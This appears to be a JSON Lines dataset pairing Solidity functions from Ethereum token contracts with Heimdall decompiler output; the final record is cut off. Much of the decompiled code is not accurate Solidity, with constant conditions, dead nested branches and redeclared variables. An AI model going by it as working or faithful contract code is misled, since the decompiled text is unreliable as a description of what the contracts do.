{"contract_address": "0xdcb0A4559562a8854074Aeaf47B9549aD1eC1163", "original_solidity_code": "function openTrading() external onlyOwner() {\\r\\n        require(!tradingOpen,\\\"trading is already open\\\");\\r\\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\r\\n        _approve(address(this), address(uniswapV2Router), _tTotal);\\r\\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\\r\\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\\r\\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\\r\\n        swapEnabled = true;\\r\\n        tradingOpen = true;\\r\\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_e / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_d = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_d));\n        require(0x08, \"ERC20: approve to the zero address\");\n        require(!0x05f5e100 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_d / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_d / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x05f5e100;\n        var_a = 0x05f5e100;\n        emit Approval(address(this), address(store_d / 0x01), 0x05f5e100);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x08 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0100 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                                if (!0x08 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0) {\n                                            }\n                                            if (!0x05f5e100 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x172F7a6F8C76321376cf077c4b68f6C0A0907d2f", "original_solidity_code": "function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }", "heimdall_decompiled_code": "function isOwner(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = !(!(address(arg0)) == (address(getOwner / 0x01)));\n        return !(!(address(arg0)) == (address(getOwner / 0x01)));\n    }"}
{"contract_address": "0x51310eD331fB85314977E02B35424dafAe5c741d", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(address(arg0) == 0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x8d2d07f485Ea0cEf2E843b1EEE5F2237e8e9d013", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x33743F9E4bf0A323807Fc1517Bb9aD9557585f48", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x08) {\n            if ((0x01 == 0x01) | !0x3b9aca00) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x08) {\n                    if ((0x01 == 0x01) | !0x3b9aca00) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x08) {\n                            if ((0x01 == 0x01) | !0x3b9aca00) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x08 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                                                    if (!0x08 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xF37412281Cb92fb10ccA519C55F0276BAFa6Ea2f", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_h[var_a]);\n        store_g = 0x01000000000000000000000000000000000000000000 | (uint248(store_g));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_f), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_f);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = storage_map_h[var_a];\n        address var_k = storage_map_h[var_a];\n        emit Approval(address(this), address(store_f), storage_map_h[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_h[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_f).code.length);\n        (bool success, bytes memory ret0) = address(store_f).Unresolved_791ac947(var_l); // call\n        store_g = uint248(store_g);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4d940f5C7f67BcD5997a27F9E3b97028B226e292", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x61b34D8c15305c8536D730C2CFF0Ba4006B7Fe67", "original_solidity_code": "function remainingTokens() public view returns (uint256) {\r\n        return\r\n            Math.min(\r\n                myToken.balanceOf(owner()),\r\n                myToken.allowance(owner(), address(this))\r\n            );\r\n    }", "heimdall_decompiled_code": "function remainingTokens() public payable returns (uint256) {\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(owner / 0x01);\n        require(address(myToken / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(myToken / 0x01).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_d == (var_d));\n        var_e = 0xdd62ed3e00000000000000000000000000000000000000000000000000000000;\n        address var_f = address(owner / 0x01);\n        address var_g = address(this);\n        require(address(myToken / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(myToken / 0x01).Unresolved_dd62ed3e(var_f); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_d == (var_d));\n        require(var_d < (var_d));\n        var_h = var_d;\n        return var_d;\n        var_h = var_d;\n        return var_d;\n    }"}
{"contract_address": "0x94a1FaF408D4F4a74e46973BF75953dB44EcA193", "original_solidity_code": "function disableTransferDelay() external onlyOwner returns (bool) {\r\n        transferDelayEnabled = false;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function disableTransferDelay() public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        transferDelayEnabled = uint248(transferDelayEnabled);\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xaE58EE426C98ed45F91282D027FAFe4E74c70D75", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x718128a4433a5053A43810C1cc51427C89046b7E", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x22;\n        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x24;\n        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0675693f486F11520F5b6814e290724cC6937312", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _Tokename;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x0c9b68640933C2b769585331907a26b5DA7C5Bf9", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x22;\n        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x24;\n        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x6a6CF1CB6cA804a9c78d078Fd8061c4a2E71B132", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xd0B4fb38f8B30Ee154db85790e555d71160107d4", "original_solidity_code": "function removeLimits() external onlyOwner{\n        _maxTxAmount = _tTotal;\n        _maxWalletSize=_tTotal;\n        emit MaxTxAmountUpdated(_tTotal);\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x0f4240) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x0f4240;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x0f4240) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x0f4240;\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x0f4240) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x0f4240;\n                                emit MaxTxAmountUpdated(0x0f4240);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xB14c3a406A345F2b4E79aB45d81A63E9a815ec71", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x328E4802787C25995e524C4280a69F985f08ea48", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n        _owner = address(0);\\r\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x53BF9362f1eD90638B06392Bc01813f162Eb8766", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xfc606C8F7141110c3f295a22004D274680A9A029", "original_solidity_code": "function getTokenOut(uint256 _amount) public view returns(uint256) {\r\n        if(_amount == 0) {\r\n            return 0;\r\n        }\r\n        return (_amount * TOKENS_PER_ETH);\r\n    }", "heimdall_decompiled_code": "function getTokenOut(uint256 arg0) public view returns (uint256) {\n        require(0 - arg0);\n        require((TOKENS_PER_ETH == ((TOKENS_PER_ETH * arg0) / arg0)) | !arg0);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        uint256 var_c = TOKENS_PER_ETH * arg0;\n        return TOKENS_PER_ETH * arg0;\n        var_c = 0;\n        return 0;\n    }"}
{"contract_address": "0xB1C76Fbd9520964Be300A66679C3ac7dae32f744", "original_solidity_code": "function name() external pure returns (string memory);\r\n\r\n    function symbol() external pure returns (string memory);\r\n\r\n    function decimals() external pure returns (uint8);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address owner) external view returns (uint256);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n\r\n    function nonces(address owner) external view returns (uint256);\r\n\r\n    function permit(\r\n        address owner,\r\n        address spender,\r\n        uint256 value,\r\n        uint256 deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) external;\r\n\r\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\r\n    event Burn(\r\n        address indexed sender,\r\n        uint256 amount0,\r\n        uint256 amount1,\r\n        address indexed to\r\n    );\r\n    event Swap(\r\n        address indexed sender,\r\n        uint256 amount0In,\r\n        uint256 amount1In,\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\r\n\r\n    function factory() external view returns (address);\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function token1() external view returns (address);\r\n\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (\r\n            uint112 reserve0,\r\n            uint112 reserve1,\r\n            uint32 blockTimestampLast\r\n        );\r\n\r\n    function price0CumulativeLast() external view returns (uint256);\r\n\r\n    function price1CumulativeLast() external view returns (uint256);\r\n\r\n    function kLast() external view returns (uint256);\r\n\r\n    function mint(address to) external returns (uint256 liquidity);\r\n\r\n    function burn(address to)\r\n        external\r\n        returns (uint256 amount0, uint256 amount1);\r\n\r\n    function swap(\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        